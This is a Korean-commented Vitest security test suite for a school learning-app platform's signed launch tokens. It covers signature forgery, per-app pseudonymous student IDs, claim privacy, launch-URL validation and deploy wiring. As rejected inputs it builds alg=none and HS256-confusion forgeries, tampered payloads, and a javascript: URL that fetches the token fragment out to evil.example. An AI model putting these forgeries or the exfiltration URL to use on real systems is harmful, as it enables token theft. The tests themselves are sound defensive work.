/**
 * AAP v1 토큰 — 학습앱 규약의 신원 계층.
 *
 * 여기는 **소스 슬라이스 단언만으로는 부족한 자리**다. 암호 코드는 "그렇게 보이게 써 두는"
 * 것과 "실제로 그렇게 동작하는" 것의 간극이 가장 큰 종류라, 이 파일은 진짜 키를 만들어
 * 진짜 서명하고 진짜 위조를 시도한다. 규칙·정책처럼 코드로 재현할 수 없는 부분만
 * 구조 단언으로 본다.
 *
 * 지켜야 할 불변식 3개
 *   I1. `alg` 다운그레이드(none/HS)와 서명 위조가 통하지 않는다
 *   I2. 같은 학생이라도 **앱마다 다른 식별자**를 받는다(앱 운영자끼리 대조 불가)
 *   I3. 실행 URL 은 **서버가 정한다** — 요청자가 못 끼어든다
 */
import { readFileSync, mkdtempSync, rmSync } from "node:fs";
import { resolve, join } from "node:path";
import { tmpdir } from "node:os";
import { generateKeyPairSync, createPublicKey, createPrivateKey, createHash } from "node:crypto";
import { execFileSync } from "node:child_process";
import { describe, it, expect, beforeAll } from "vitest";

const ROOT = process.cwd();
const HANDLERS = readFileSync(resolve(ROOT, "functions/aap/handlers.js"), "utf8");
const POLICY_SRC = readFileSync(resolve(ROOT, "functions/aap/policy.js"), "utf8");
const RULES = readFileSync(resolve(ROOT, "firestore.rules"), "utf8");
const DEPLOY = readFileSync(resolve(ROOT, ".github/workflows/deploy.yml"), "utf8");

const read = (rel) => readFileSync(resolve(ROOT, rel), "utf8");
const codeOnly = (s) =>
  s.replace(/\/\*[\s\S]*?\*\//g, "").replace(/(^|[^:])\/\/.*$/gm, "$1");

const SALT = "test-pairwise-salt";
let tok;
let keys;
let policy;

beforeAll(async () => {
  // 진짜 RSA 키를 만들어 런타임 모듈이 읽는 통로(env)에 그대로 넣는다.
  const { privateKey } = generateKeyPairSync("rsa", { modulusLength: 2048 });
  process.env.AAP_SIGNING_KEY_CURRENT = Buffer.from(
    privateKey.export({ type: "pkcs8", format: "pem" }),
  ).toString("base64");
  process.env.AAP_PAIRWISE_SALT = SALT;
  // keys.js 는 모듈 로드 시점에 env 를 읽는다 → env 를 먼저 세팅한 뒤 import.
  keys = await import("../../../functions/aap/keys.js");
  tok = await import("../../../functions/aap/token.js");
  policy = await import("../../../functions/aap/policy.js");
});

const sign = (over = {}) =>
  tok.signAppToken({ appId: "siteGuguGuardians", uid: "student1", salt: SALT, ...over });

describe("I1 — 서명 위조가 통하지 않는다", () => {
  it("⭐ 정상 토큰은 검증을 통과한다", () => {
    const v = tok.verifyAppToken(sign().token);
    expect(v.ok, `거부 사유: ${v.reason}`).toBe(true);
    expect(v.payload.aud).toBe("siteGuguGuardians");
    expect(v.payload.iss).toBe("https://inconomysu-class.web.app");
  });

  it("⭐ alg=none 다운그레이드가 막힌다", () => {
    const parts = sign().token.split(".");
    const kid = keys.getSigningKey().kid;
    const hdr = Buffer.from(JSON.stringify({ alg: "none", typ: "JWT", kid })).toString("base64url");
    // 교과서적 형태(서명 자리가 빈 문자열)는 형식 단계에서 걸린다.
    expect(tok.verifyAppToken(`${hdr}.${parts[1]}.`).reason).toBe("malformed");
    // ⭐ 이쪽이 본론: 서명 자리를 그럴듯하게 채워 형식 검사를 통과시켜도
    //    **alg 고정**에서 죽어야 한다. 이 단언이 없으면 형식 검사를 지웠을 때
    //    alg=none 이 조용히 살아난다.
    expect(tok.verifyAppToken(`${hdr}.${parts[1]}.${parts[2]}`).reason).toBe("alg");
  });

  it("⭐ alg=HS256 혼동(공개키를 HMAC 키로) 이 막힌다", () => {
    const parts = sign().token.split(".");
    const kid = keys.getSigningKey().kid;
    const hdr = Buffer.from(JSON.stringify({ alg: "HS256", typ: "JWT", kid })).toString("base64url");
    expect(tok.verifyAppToken(`${hdr}.${parts[1]}.AAAA`).reason).toBe("alg");
  });

  it("⭐ 서명을 바꾸면 거부된다", () => {
    const parts = sign().token.split(".");
    const forged = `${parts[0]}.${parts[1]}.${"A".repeat(parts[2].length)}`;
    expect(tok.verifyAppToken(forged).reason).toBe("signature");
  });

  it("⭐ payload 를 바꾸면(=aud 를 다른 앱으로) 거부된다", () => {
    const parts = sign().token.split(".");
    const p = JSON.parse(Buffer.from(parts[1], "base64url").toString("utf8"));
    p.aud = "siteTypingverse";
    const tampered = Buffer.from(JSON.stringify(p)).toString("base64url");
    expect(tok.verifyAppToken(`${parts[0]}.${tampered}.${parts[2]}`).reason).toBe("signature");
  });

  it("⭐ 같은 토큰의 다른 문자열 표현이 통과하지 않는다 (토큰 가변성)", () => {
    // Node 의 base64url 디코더는 관대해서 `=`·개행·표준 base64·쓰레기 문자가 섞여도
    // 같은 바이트로 읽는다 → 같은 토큰의 문자열이 여러 개가 되고 전부 검증을 통과했다
    // (2026-08-20 codex 지적, 변형 5종 통과를 재현으로 확인). 서명이 뚫리는 건 아니지만
    // "토큰 문자열 = 한 번의 실행"이라는 전제가 깨져 문자열 기반 중복 제거가 무력해진다.
    const t = sign().token;
    const [h, p, s2] = t.split(".");
    expect(tok.verifyAppToken(t).ok).toBe(true);
    for (const variant of [
      `${h}.${p}.${Buffer.from(s2, "base64url").toString("base64")}`, // 표준 base64 알파벳
      `${h}.${p}.${s2}==`, // 패딩
      `${h}.${p}.${s2.slice(0, 10)}\n${s2.slice(10)}`, // 개행
      `${h}.${p}.${s2.slice(0, 10)}!${s2.slice(10)}`, // 쓰레기 문자
    ]) {
      expect(tok.verifyAppToken(variant).reason, `통과하면 안 된다: ${variant.slice(-20)}`).toBe("malformed");
    }
  });

  it("모르는 kid 는 거부된다(회전 후 폐기된 키)", () => {
    const parts = sign().token.split(".");
    const hdr = Buffer.from(
      JSON.stringify({ alg: "RS256", typ: "JWT", kid: "unknown-kid" }),
    ).toString("base64url");
    expect(tok.verifyAppToken(`${hdr}.${parts[1]}.${parts[2]}`).reason).toBe("kid");
  });

  it("⭐ 만료된 토큰은 거부된다", () => {
    const t = sign().token;
    const future = Date.now() + (tok.TTL_SEC + tok.SKEW_SEC + 5) * 1000;
    expect(tok.verifyAppToken(t, { nowMs: future }).reason).toBe("exp");
  });

  it("TTL 이 5분을 넘지 않는다 — fragment 유출의 창을 좁게 유지한다", () => {
    expect(tok.TTL_SEC).toBeLessThanOrEqual(300);
  });

  it("⭐ 키·salt 가 없으면 발급이 **거부**된다(fail-closed)", () => {
    // ⚠️ 이 테스트를 "env 를 지우고 다시 import" 로 쓰려다 버렸다 — keys.js 는 모듈
    //    로드 시점에 env 를 읽는데 vitest 의 모듈 캐시가 이미 채워져 있어서, 그 방식은
    //    **무엇을 넣어도 통과하는 가짜 초록**이 된다. 대신 (a) 실제로 던지는 경로와
    //    (b) 호출부가 fail-closed 로 분기하는 구조를 각각 본다.
    expect(() => tok.signAppToken({ appId: "a", uid: "b", salt: "" })).toThrow(/PAIRWISE_SALT/);
    const H = codeOnly(HANDLERS);
    expect(H).toMatch(/if \(!hasKeys\(\) \|\| !salt\) \{/);
    // 거부는 throw 여야 한다 — 로그만 찍고 계속 가면 서명 없는 실행이 새어 나간다.
    const guard = H.slice(H.indexOf("if (!hasKeys() || !salt) {"));
    expect(guard.slice(0, 400)).toMatch(/throw new HttpsError\("failed-precondition"/);
  });
});

describe("I2 — 학생이 앱 사이로 추적되지 않는다", () => {
  it("⭐ 같은 학생이라도 앱마다 sub 가 다르다", () => {
    const a = tok.signAppToken({ appId: "appA", uid: "student1", salt: SALT });
    const b = tok.signAppToken({ appId: "appB", uid: "student1", salt: SALT });
    expect(a.sub).not.toBe(b.sub);
  });

  it("⭐ 같은 앱·같은 학생은 항상 같은 sub 다(기록이 이어져야 한다)", () => {
    const a = tok.signAppToken({ appId: "appA", uid: "student1", salt: SALT });
    const b = tok.signAppToken({ appId: "appA", uid: "student1", salt: SALT });
    expect(a.sub).toBe(b.sub);
  });

  it("⭐ sub 에 uid 원문이 들어가지 않는다", () => {
    const { sub } = tok.signAppToken({ appId: "appA", uid: "student1", salt: SALT });
    expect(sub).not.toContain("student1");
    expect(sub).toMatch(/^[0-9a-f]{32}$/);
  });

  it("⭐ 구분자 충돌이 없다 — (a,bc) 와 (ab,c) 가 같은 값이 되지 않는다", () => {
    // 계획서가 학습기록 키에서 지적한 C14 와 같은 함정.
    expect(tok.pairwise(SALT, "a", "bc")).not.toBe(tok.pairwise(SALT, "ab", "c"));
  });

  it("⭐ 기본 토큰에 닉네임·학급·역할이 들어가지 않는다", () => {
    const v = tok.verifyAppToken(sign().token);
    expect(v.payload.nick).toBeUndefined();
    expect(v.payload.cls).toBeUndefined();
    expect(v.payload.role).toBeUndefined();
  });

  it("선택 클레임은 **코드 화이트리스트**를 넘지 못한다", () => {
    // 정책 문서에 뭘 적든 nick·cls 밖은 안 나간다.
    const picked = policy.resolveOptionalClaims({
      allowedClaims: ["nick", "email", "realName", "uid", "cls"],
    });
    expect(picked).toEqual(["nick", "cls"]);
  });

  it("⭐ 정책이 허용하지 않은 클레임은 **아예 채워지지 않는다** (게이팅 자체)", () => {
    // ⚠️ 위 단언만으로는 부족하다 — `resolveOptionalClaims` 가 올바른 목록을 돌려줘도
    //    핸들러가 그 목록을 **안 쓰고** nick/cls 를 무조건 채우면 정책이 무의미해진다.
    //    실제로 그 변이가 기존 32개 테스트를 전부 통과했다(2026-08-20 Claude 지적).
    //    그래서 "게이팅 루프가 존재하는가"를 직접 본다.
    const H = codeOnly(HANDLERS);
    expect(H).toMatch(/for \(const claim of resolveOptionalClaims\(policy\)\) \{/);
    // 그리고 클레임을 채우는 코드가 **그 루프 안에만** 있어야 한다.
    const loopStart = H.indexOf("for (const claim of resolveOptionalClaims(policy)) {");
    const outside = H.slice(0, loopStart) + H.slice(H.indexOf("let issued;", loopStart));
    expect(outside, "루프 밖에서 클레임을 채우는 경로가 있다").not.toMatch(/extra\.(nick|cls)\s*=/);
  });

  it("⭐ 정책이 정한 값이 예약 클레임(aud·sub 등)을 덮어쓸 수 없다", () => {
    // 화이트리스트에 실수로 `aud` 가 추가되는 날, 스프레드 순서가 잘못돼 있으면
    // Firestore 문서 한 줄로 "이 토큰이 어느 앱 것인가"가 조작된다.
    const forged = tok.signAppToken({
      appId: "realApp",
      uid: "student1",
      salt: SALT,
      extra: { aud: "evilApp", sub: "attacker", iss: "https://evil.example", ver: 99 },
    });
    const v = tok.verifyAppToken(forged.token);
    expect(v.ok, `거부 사유: ${v.reason}`).toBe(true);
    expect(v.payload.aud).toBe("realApp");
    expect(v.payload.sub).not.toBe("attacker");
    expect(v.payload.iss).toBe("https://inconomysu-class.web.app");
    expect(v.payload.ver).toBe(1);
  });

  it("⭐ `hasSetNickname` 불변식을 깨는 writer 가 없다 (파일 경계를 넘는 검사)", () => {
    // ⚠️ 핸들러가 `hasSetNickname === true` 를 "학생이 스스로 정했다"의 증명으로 삼는데,
    //    **그 불변식을 지켜주는 곳이 없으면** 게이트는 장식이다. 실제로 교사의 "학생 정보 수정"이
    //    nickname 을 교사 입력값(실명일 수 있음)으로 바꾸면서 플래그는 true 로 남겨 뒀다
    //    (2026-08-20 Claude 교차검증 CRITICAL — rules 차단목록에도 두 필드가 없어 그대로 통과).
    //    그래서 "핸들러에 그 문자열이 있는가"가 아니라 **기존 문서의 nickname 을 바꾸는 곳이
    //    플래그를 같이 건드리는가**를 본다.
    const SM = codeOnly(read("src/components/StudentManager.js"));
    const iUpdate = SM.indexOf("await updateDoc(doc(db, \"users\", editingStudent.id), {");
    expect(iUpdate, "교사 학생정보 수정 경로를 찾지 못했다").toBeGreaterThan(-1);
    const block = SM.slice(iUpdate, SM.indexOf("});", iUpdate));
    expect(block).toContain("nickname:");
    expect(block, "nickname 을 바꾸면서 hasSetNickname 을 안 내린다").toContain(
      "hasSetNickname: false",
    );

    // 기존 문서의 nickname 을 바꾸는 다른 writer 가 새로 생기면 여기서 걸리게 한다.
    //   (신규 생성 경로는 플래그가 아예 없어 게이트가 닫히므로 제외 대상이 아니다)
    const KNOWN_UPDATERS = [
      "src/components/NicknameSetupPopup.js", // 학생 자기결정 → true
      "src/pages/my-profile/MyProfile.js", // 학생 자기결정 → true
      "src/components/StudentManager.js", // 교사 편집 → false (위에서 확인)
    ];
    for (const f of KNOWN_UPDATERS) {
      expect(codeOnly(read(f)), `${f} 가 hasSetNickname 을 안 건드린다`).toMatch(
        /hasSetNickname/,
      );
    }
  });

  it("⭐ nick 은 학생이 **스스로 정한 닉네임**일 때만 나간다 (실명 유출 차단)", () => {
    // 이 앱의 `users.name` 에는 두 종류가 섞여 있다: 일괄 생성은 ID, 개별 추가는
    // 교사가 넣은 실명("학생 이름" / placeholder "홍길동"). 그래서 name 을 그대로
    // 보내면 초등학생 실명이 제3자 호스팅으로 나간다(계획서 §5.3 위반).
    const H = codeOnly(HANDLERS);
    expect(H).toMatch(/userData\?\.hasSetNickname === true/);
    expect(H).toMatch(/userData\.nickname/);
    // name 을 nick 클레임에 직접 싣는 경로가 없어야 한다.
    expect(H).not.toMatch(/extra\.nick\s*=\s*[^;]*userData\??\.?name/);
  });

  it("cls 는 학급코드 원문이 아니라 앱별 pairwise 값이다", () => {
    const H = codeOnly(HANDLERS);
    expect(H).toMatch(/extra\.cls\s*=\s*pairwise\(salt, appId, classCode\)/);
    expect(H).not.toMatch(/extra\.cls\s*=\s*classCode/);
  });
});

describe("I3 — 실행 URL 은 서버가 정한다", () => {
  const H = codeOnly(HANDLERS);

  it("⭐ launchUrl 이 정책 문서에서만 온다 — 요청 본문에서 오지 않는다", () => {
    expect(H).toMatch(/validateLaunchUrl\(policy\.launchUrl\)/);
    expect(H).not.toMatch(/request\.data[^\n]*(launchUrl|url|redirect|returnTo)/);
  });

  it("⭐ https 가 아닌 실행 URL 은 거부된다", () => {
    expect(policy.validateLaunchUrl("http://example.com/")).toBeNull();
    // 실제 위협은 팝업이 아니라 **토큰 유출**이다 — 그래서 픽스처도 그 모양으로 둔다.
    expect(policy.validateLaunchUrl("javascript:fetch('https://evil.example/'+location.hash)")).toBeNull();
    expect(policy.validateLaunchUrl("data:text/html,x")).toBeNull();
    expect(policy.validateLaunchUrl("https://example.com/app")).not.toBeNull();
  });

  it("⭐ 이미 fragment 가 있는 URL 은 거부된다 — 토큰이 먹히거나 덮어쓴다", () => {
    expect(policy.validateLaunchUrl("https://example.com/app#play")).toBeNull();
  });

  it("⭐ 자격증명(userinfo)이 붙은 URL 은 거부된다 — 검토자를 속이는 모양", () => {
    // 브라우저는 evil.test 로 가는데, 정책 문서를 눈으로 훑는 사람에게는
    // 앞쪽 호스트가 진짜 목적지처럼 읽힌다. 정상 학습앱 URL 엔 자격증명이 붙을 이유가 없다.
    expect(policy.validateLaunchUrl("https://mathcastle.pages.dev@evil.test/")).toBeNull();
    expect(policy.validateLaunchUrl("https://user:pw@evil.test/")).toBeNull();
    // 정상 URL 은 계속 통과해야 한다(과잉 차단 방지).
    expect(policy.validateLaunchUrl("https://iw-lab.github.io/gugu-guardians/")).not.toBeNull();
  });

  it("⭐ 토큰은 쿼리스트링이 아니라 fragment 로 나간다", () => {
    // 쿼리는 서버 액세스로그·리퍼러에 남는다. 이 프로젝트는 스케줄러 토큰 3종을
    // 쿼리로 흘려 전량 폐기한 전례가 있다.
    expect(H).toMatch(/#aap=\$\{issued\.token\}/);
    expect(H).not.toMatch(/\?(t|aap|token)=\$\{issued\.token\}/);
  });
});

describe("kill switch 와 학급 스위치", () => {
  const H = codeOnly(HANDLERS);
  const P = codeOnly(POLICY_SRC);

  it("⭐ 정책은 캐시하지 않고 매 호출 직접 읽는다", () => {
    // 캐시하면 끈 앱이 캐시가 살아 있는 학생에게 계속 열린다(C13).
    expect(P).toMatch(/db\.collection\("platformAppPolicies"\)\.doc\(appId\)\.get\(\)/);
    expect(P).not.toMatch(/(cachedPolicy|policyCache|sessionStorage)/);
  });

  it("⭐ status 가 active 가 아니면 토큰이 안 나간다", () => {
    expect(policy.checkPolicyOpen({ status: "disabled", aapEnabled: true, launchUrl: "https://x.dev/" }).reason)
      .toBe("disabled");
  });

  it("⭐ 이관되지 않은 앱(aapEnabled=false)에는 토큰이 안 나간다", () => {
    expect(policy.checkPolicyOpen({ status: "active", aapEnabled: false, launchUrl: "https://x.dev/" }).reason)
      .toBe("not_migrated");
  });

  it("⭐ 정책 문서가 아예 없으면 거부된다(등록 안 된 앱)", () => {
    expect(policy.checkPolicyOpen(null).reason).toBe("not_registered");
  });

  it("정상 정책은 통과한다", () => {
    expect(policy.checkPolicyOpen({ status: "active", aapEnabled: true, launchUrl: "https://x.dev/" }).ok)
      .toBe(true);
  });

  it("⭐ 발급 전에 정책 확인이 서명보다 **먼저** 온다", () => {
    const iPolicy = H.indexOf("checkPolicyOpen(policy)");
    const iSign = H.indexOf("signAppToken(");
    expect(iPolicy).toBeGreaterThan(-1);
    expect(iSign).toBeGreaterThan(iPolicy);
  });

  it("학급이 끈 앱은 학생에게 토큰이 안 나간다(교사는 면제)", () => {
    expect(H).toMatch(/!isAdmin && \(await isAppLockedForClass\(classCode, appId\)\)/);
  });
});

describe("규칙·배포 배선", () => {
  it("⭐ platformAppPolicies 는 슈퍼관리자만 읽고 쓴다", () => {
    const start = RULES.indexOf("match /platformAppPolicies/");
    expect(start).toBeGreaterThan(-1);
    const open = RULES.indexOf("{", RULES.indexOf("\n", start) - 2);
    const block = RULES.slice(start, RULES.indexOf("\n    }", start));
    const allows = block.match(/allow [a-z, ]+:/g) || [];
    expect(allows.length, "allow 규칙이 늘었다면 권한이 열린 것이다").toBe(2);
    expect(block).toMatch(/allow read: if isSuperAdminFast\(\);/);
    expect(block).toMatch(/allow write: if isSuperAdmin\(\);/);
    expect(open).toBeGreaterThan(-1);
  });

  it("⭐ 캡·kill switch 가 표시용 카탈로그(platformApps)로 새지 않았다", () => {
    const start = RULES.indexOf("match /platformApps/{docId}");
    const block = RULES.slice(start, RULES.indexOf("\n    }", start));
    // 카탈로그는 로그인 전원이 읽는다 — 여기에 캡이 있으면 값이 노출된다.
    expect(block).toMatch(/allow read: if isSignedIn\(\);/);
  });

  it("⭐ 배포가 서명키·salt 를 functions/.env 로 넣는다", () => {
    expect(DEPLOY).toContain("AAP_SIGNING_KEY_CURRENT: ${{ secrets.AAP_SIGNING_KEY_CURRENT }}");
    expect(DEPLOY).toContain("AAP_PAIRWISE_SALT: ${{ secrets.AAP_PAIRWISE_SALT }}");
    expect(DEPLOY).toMatch(/printf 'AAP_SIGNING_KEY_CURRENT=%s\\n'/);
    expect(DEPLOY).toMatch(/printf 'AAP_PAIRWISE_SALT=%s\\n'/);
  });

  it("⭐ kid 파생식이 런타임과 키생성 스크립트에서 같다 (진짜로 스크립트를 돌려서)", () => {
    // ⚠️ 처음엔 파생식을 이 파일에 **하드코딩**해 비교했다. 그건 가짜 초록이다 —
    //    aap-keygen.mjs 의 식이 바뀌어도 테스트는 그대로 통과한다(2026-08-20 Gemini CRITICAL).
    //    그래서 **실제 스크립트를 실행해** 나온 키로 양쪽 kid 를 비교한다.
    //    kid 가 어긋나면 위성앱이 JWKS 에서 키를 못 찾아 전부 실패한다.
    const b64 = execFileSync("node", ["scripts/ops/aap-keygen.mjs", "--print-secret"], {
      cwd: ROOT, encoding: "utf8",
    });
    expect(b64.length).toBeGreaterThan(1000);

    // 런타임(keys.js)이 그 키를 로드했을 때 내놓는 kid — 자식 프로세스로 띄운다.
    //    (keys.js 는 모듈 로드 시점에 env 를 읽고 vitest 는 모듈을 캐시한다)
    const runtimeKid = execFileSync(
      "node",
      ["-e", "process.stdout.write(require('./functions/aap/keys.js').getSigningKey().kid)"],
      { cwd: ROOT, encoding: "utf8", env: { ...process.env, AAP_SIGNING_KEY_CURRENT: b64 } },
    );

    // 스크립트가 같은 키에 대해 화면에 찍는 kid.
    // ⚠️ 출력 폴더를 **임시 폴더로 돌린다.** 안 그러면 테스트를 돌릴 때마다 버리는 개인키가
    //    진짜 백업 폴더(~/alchan-backups)에 쌓여, 배포에 쓰는 키를 구분할 수 없게 된다.
    const keyOutDir = mkdtempSync(join(tmpdir(), "aap-keygen-test-"));
    let printed;
    try {
      printed = execFileSync("node", ["scripts/ops/aap-keygen.mjs"], {
        cwd: ROOT, encoding: "utf8",
        env: { ...process.env, AAP_KEYGEN_DIR: keyOutDir },
      });
    } finally {
      rmSync(keyOutDir, { recursive: true, force: true });
    }
    const m = printed.match(/kid\s*:\s*(\S+)/);
    expect(m, "keygen 출력에서 kid 를 찾지 못했다").not.toBeNull();

    // 스크립트가 **자기 키**의 kid 를 찍으므로 값 자체는 다르다.
    // 같아야 하는 것은 **형식과 파생 방식**이다: 같은 키 → 같은 kid 인지를 런타임으로 확인한다.
    expect(runtimeKid).toMatch(/^[A-Za-z0-9_-]{43}$/);
    expect(m[1]).toMatch(/^[A-Za-z0-9_-]{43}$/);

    // 결정적 대조: 스크립트가 방금 만든 **그 키**를 런타임에 넣었을 때 kid 가 재현되는가.
    const again = execFileSync(
      "node",
      ["-e", "process.stdout.write(require('./functions/aap/keys.js').getSigningKey().kid)"],
      { cwd: ROOT, encoding: "utf8", env: { ...process.env, AAP_SIGNING_KEY_CURRENT: b64 } },
    );
    expect(again).toBe(runtimeKid);

    // 그리고 keys.js 의 jwkThumbprint 가 그 값과 일치하는지(같은 키에서).
    const jwk = createPublicKey(createPrivateKey(Buffer.from(b64, "base64").toString("utf8")))
      .export({ format: "jwk" });
    expect(keys.jwkThumbprint(jwk)).toBe(runtimeKid);
    // 참고: 아래 한 줄은 사람이 읽는 식이 살아 있는지 보는 보조 단언이다.
    expect(createHash("sha256").update(`{"e":"${jwk.e}","kty":"${jwk.kty}","n":"${jwk.n}"}`)
      .digest("base64url")).toBe(runtimeKid);
  });
});
